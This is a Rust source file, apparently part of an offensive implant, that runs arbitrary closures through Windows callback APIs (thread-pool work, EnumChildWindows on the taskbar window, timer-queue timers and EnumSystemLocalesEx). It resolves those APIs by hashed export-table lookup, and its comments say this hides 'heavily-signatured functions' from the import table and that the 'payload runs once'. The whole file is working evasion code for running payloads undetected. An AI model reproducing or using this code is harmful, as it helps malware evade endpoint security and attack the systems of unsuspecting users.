#[cfg(windows)]
use winapi::shared::minwindef::{BOOL, FALSE, LPARAM};
#[cfg(windows)]
use winapi::shared::ntdef::HANDLE;
#[cfg(windows)]
use winapi::um::winnt::{PTP_CALLBACK_INSTANCE, PTP_WORK, PVOID, WT_EXECUTEINTIMERTHREAD};

// ── Dynamic resolution helpers (no IAT entries) ──────────────────────────
//
// All callback-execution APIs are resolved at runtime via PE export-table
// hashing so that no import-table entries are created for these heavily-
// signatured functions.

#[cfg(windows)]
use std::sync::OnceLock;

#[cfg(windows)]
fn resolve_fn<T>(lock: &OnceLock<Option<T>>, dll_bytes: &[u8], fn_bytes: &[u8]) -> Option<T>
where
    T: Copy,
{
    *lock.get_or_init(|| unsafe {
        let dll_hash = pe_resolve::hash_str(dll_bytes);
        let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
        let fn_hash = pe_resolve::hash_str(fn_bytes);
        let addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
        Some(std::mem::transmute_copy(&addr))
    })
}

#[cfg(windows)]
static CREATE_THREADPOOL_WORK: OnceLock<Option<unsafe extern "system" fn(Option<extern "system" fn(PTP_CALLBACK_INSTANCE, PVOID, PTP_WORK)>, PVOID, *mut std::ffi::c_void) -> PTP_WORK>> = OnceLock::new();

#[cfg(windows)]
static SUBMIT_THREADPOOL_WORK: OnceLock<Option<unsafe extern "system" fn(PTP_WORK)>> = OnceLock::new();

#[cfg(windows)]
static CLOSE_THREADPOOL_WORK: OnceLock<Option<unsafe extern "system" fn(PTP_WORK)>> = OnceLock::new();

#[cfg(windows)]
static CREATE_TIMER_QUEUE_TIMER: OnceLock<Option<unsafe extern "system" fn(*mut HANDLE, HANDLE, Option<extern "system" fn(PVOID, winapi::um::winnt::BOOLEAN)>, PVOID, u32, u32, u32) -> BOOL>> = OnceLock::new();

#[cfg(windows)]
static DELETE_TIMER_QUEUE_TIMER: OnceLock<Option<unsafe extern "system" fn(HANDLE, HANDLE, HANDLE) -> BOOL>> = OnceLock::new();

#[cfg(windows)]
static ENUM_SYSTEM_LOCALES_EX: OnceLock<Option<unsafe extern "system" fn(Option<extern "system" fn(*mut u16, u32, LPARAM) -> BOOL>, u32, LPARAM, *mut std::ffi::c_void) -> BOOL>> = OnceLock::new();

#[cfg(windows)]
static ENUM_CHILD_WINDOWS: OnceLock<Option<unsafe extern "system" fn(winapi::shared::windef::HWND, Option<extern "system" fn(winapi::shared::windef::HWND, LPARAM) -> BOOL>, LPARAM) -> BOOL>> = OnceLock::new();

#[cfg(windows)]
static FIND_WINDOW_A: OnceLock<Option<unsafe extern "system" fn(*const i8, *const i8) -> winapi::shared::windef::HWND>> = OnceLock::new();

pub enum CallbackType {
    ThreadpoolWork,
    EnumChildWindows,
    CreateTimerQueueTimer,
    EnumSystemLocalesA,
}

#[cfg(windows)]
extern "system" fn threadpool_callback(
    _instance: PTP_CALLBACK_INSTANCE,
    context: PVOID,
    work: PTP_WORK,
) {
    if !context.is_null() {
        let closure: Box<Box<dyn FnOnce() + Send>> = unsafe { Box::from_raw(context as *mut _) };
        closure();
    }
    if !work.is_null() {
        if let Some(close_fn) = resolve_fn(&CLOSE_THREADPOOL_WORK, b"kernel32.dll\0", b"CloseThreadpoolWork\0") {
            unsafe { close_fn(work) };
        } else {
            log::warn!("callback_exec: CloseThreadpoolWork not resolved, leaking work object");
        }
    }
}

#[cfg(windows)]
pub fn execute_in_threadpool<F>(f: F) -> Result<(), anyhow::Error>
where
    F: FnOnce() + Send + 'static,
{
    let closure: Box<Box<dyn FnOnce() + Send>> = Box::new(Box::new(f));
    let context = Box::into_raw(closure) as PVOID;
    let create_fn = resolve_fn(&CREATE_THREADPOOL_WORK, b"kernel32.dll\0", b"CreateThreadpoolWork\0")
        .ok_or_else(|| anyhow::anyhow!("failed to resolve CreateThreadpoolWork dynamically"))?;
    let submit_fn = resolve_fn(&SUBMIT_THREADPOOL_WORK, b"kernel32.dll\0", b"SubmitThreadpoolWork\0")
        .ok_or_else(|| anyhow::anyhow!("failed to resolve SubmitThreadpoolWork dynamically"))?;
    unsafe {
        let work = create_fn(Some(threadpool_callback), context, std::ptr::null_mut());
        if work.is_null() {
            let _ = Box::from_raw(context as *mut Box<dyn FnOnce() + Send>);
            anyhow::bail!("CreateThreadpoolWork failed");
        }
        submit_fn(work);
    }
    Ok(())
}

#[cfg(windows)]
extern "system" fn child_windows_callback(
    _hwnd: winapi::shared::windef::HWND,
    lparam: LPARAM,
) -> BOOL {
    if lparam != 0 {
        let closure: Box<Box<dyn FnOnce() + Send>> = unsafe { Box::from_raw(lparam as *mut _) };
        closure();
    }
    FALSE // Stop enumeration
}

#[cfg(windows)]
pub fn execute_enum_child_windows<F>(f: F) -> Result<(), anyhow::Error>
where
    F: FnOnce() + Send + 'static,
{
    let closure: Box<Box<dyn FnOnce() + Send>> = Box::new(Box::new(f));
    let lparam = Box::into_raw(closure) as LPARAM;
    let find_window = resolve_fn(&FIND_WINDOW_A, b"user32.dll\0", b"FindWindowA\0")
        .ok_or_else(|| anyhow::anyhow!("failed to resolve FindWindowA dynamically"))?;
    let enum_child = resolve_fn(&ENUM_CHILD_WINDOWS, b"user32.dll\0", b"EnumChildWindows\0")
        .ok_or_else(|| anyhow::anyhow!("failed to resolve EnumChildWindows dynamically"))?;
    unsafe {
        let parent = find_window(b"Shell_TrayWnd\0".as_ptr() as _, std::ptr::null());
        if !parent.is_null() {
            enum_child(parent, Some(child_windows_callback), lparam);
        } else {
            let _ = Box::from_raw(lparam as *mut Box<dyn FnOnce() + Send>);
            anyhow::bail!("FindWindowA failed");
        }
    }
    Ok(())
}

/// Context block passed to the timer-queue callback.
/// The `timer_handle` field is written by `execute_timer_queue` immediately
/// after `CreateTimerQueueTimer` returns; the callback spins until that store
/// is visible, then calls `DeleteTimerQueueTimer` to release the kernel object.
#[cfg(windows)]
struct TimerQueueCtx {
    timer_handle: std::sync::atomic::AtomicUsize,
    closure: std::sync::Mutex<Option<Box<dyn FnOnce() + Send>>>,
}

#[cfg(windows)]
extern "system" fn timer_queue_callback(
    param: PVOID,
    _timer_or_wait_fired: winapi::um::winnt::BOOLEAN,
) {
    if param.is_null() {
        return;
    }
    // SAFETY: execute_timer_queue gives us sole ownership of this allocation;
    // Box::from_raw reclaims it when this function returns.
    let ctx = unsafe { Box::from_raw(param as *mut TimerQueueCtx) };
    // Run the user closure.
    if let Ok(mut g) = ctx.closure.lock() {
        if let Some(f) = g.take() {
            f();
        }
    }
    // Spin-wait until execute_timer_queue writes the timer handle (the race
    // window is extremely narrow: dwDueTime=0 still requires a scheduler
    // round-trip before this thread runs).
    let mut h = 0usize;
    for _ in 0..10_000 {
        h = ctx.timer_handle.load(std::sync::atomic::Ordering::Acquire);
        if h != 0 {
            break;
        }
        std::hint::spin_loop();
    }
    // Delete the one-shot timer to release its kernel object.
    if h != 0 {
        if let Some(delete_fn) = resolve_fn(&DELETE_TIMER_QUEUE_TIMER, b"kernel32.dll\0", b"DeleteTimerQueueTimer\0") {
            unsafe {
                delete_fn(std::ptr::null_mut(), h as HANDLE, std::ptr::null_mut());
            }
        } else {
            log::warn!("callback_exec: DeleteTimerQueueTimer not resolved, leaking timer");
        }
    }
    // ctx is dropped here, freeing the heap allocation.
}

#[cfg(windows)]
pub fn execute_timer_queue<F>(f: F) -> Result<(), anyhow::Error>
where
    F: FnOnce() + Send + 'static,
{
    let ctx = Box::new(TimerQueueCtx {
        timer_handle: std::sync::atomic::AtomicUsize::new(0),
        closure: std::sync::Mutex::new(Some(Box::new(f) as Box<dyn FnOnce() + Send>)),
    });
    let create_timer_fn = resolve_fn(&CREATE_TIMER_QUEUE_TIMER, b"kernel32.dll\0", b"CreateTimerQueueTimer\0")
        .ok_or_else(|| anyhow::anyhow!("failed to resolve CreateTimerQueueTimer dynamically"))?;
    let ctx_ptr = Box::into_raw(ctx);
    unsafe {
        let mut handle: HANDLE = std::ptr::null_mut();
        if create_timer_fn(
            &mut handle,
            std::ptr::null_mut(),
            Some(timer_queue_callback),
            ctx_ptr as PVOID,
            0,
            0,
            WT_EXECUTEINTIMERTHREAD,
        ) == 0
        {
            // Reclaim the allocation since no callback will free it.
            drop(Box::from_raw(ctx_ptr));
            anyhow::bail!("CreateTimerQueueTimer failed");
        }
        // Store the handle so the callback can call DeleteTimerQueueTimer.
        (*ctx_ptr)
            .timer_handle
            .store(handle as usize, std::sync::atomic::Ordering::Release);
    }
    Ok(())
}

#[cfg(windows)]
thread_local! {
    static LOCALE_CALLBACK_CTX: std::cell::Cell<*mut Box<dyn FnOnce() + Send>> =
        std::cell::Cell::new(std::ptr::null_mut());
}

#[cfg(windows)]
extern "system" fn enum_locales_ex_callback(
    _locale_name: *mut u16,
    _flags: u32,
    lparam: LPARAM,
) -> BOOL {
    // lparam holds the raw Box pointer.  Execute once then signal done by
    // returning FALSE (stop enumeration).
    if lparam != 0 {
        let closure: Box<Box<dyn FnOnce() + Send>> = unsafe { Box::from_raw(lparam as *mut _) };
        closure();
    }
    FALSE // Stop enumeration after first callback — payload runs once
}

#[cfg(windows)]
pub fn execute_enum_system_locales<F>(f: F) -> Result<(), anyhow::Error>
where
    F: FnOnce() + Send + 'static,
{
    let enum_fn = resolve_fn(&ENUM_SYSTEM_LOCALES_EX, b"kernel32.dll\0", b"EnumSystemLocalesEx\0")
        .ok_or_else(|| anyhow::anyhow!("failed to resolve EnumSystemLocalesEx dynamically"))?;
    let closure: Box<Box<dyn FnOnce() + Send>> = Box::new(Box::new(f));
    let lparam = Box::into_raw(closure) as LPARAM;
    unsafe {
        // LOCALE_ALL = 0; EnumSystemLocalesEx passes lparam to the callback.
        if enum_fn(
            Some(enum_locales_ex_callback),
            0,
            lparam,
            std::ptr::null_mut(),
        ) == FALSE
        {
            // Reclaim the closure if the API failed before any callback.
            let _ = Box::from_raw(lparam as *mut Box<dyn FnOnce() + Send>);
            anyhow::bail!("EnumSystemLocalesEx failed");
        }
    }
    Ok(())
}

#[cfg(windows)]
pub fn execute_task<F>(cb_type: CallbackType, f: F) -> Result<(), anyhow::Error>
where
    F: FnOnce() + Send + 'static,
{
    match cb_type {
        CallbackType::ThreadpoolWork => execute_in_threadpool(f),
        CallbackType::EnumChildWindows => execute_enum_child_windows(f),
        CallbackType::CreateTimerQueueTimer => execute_timer_queue(f),
        CallbackType::EnumSystemLocalesA => execute_enum_system_locales(f),
    }
}
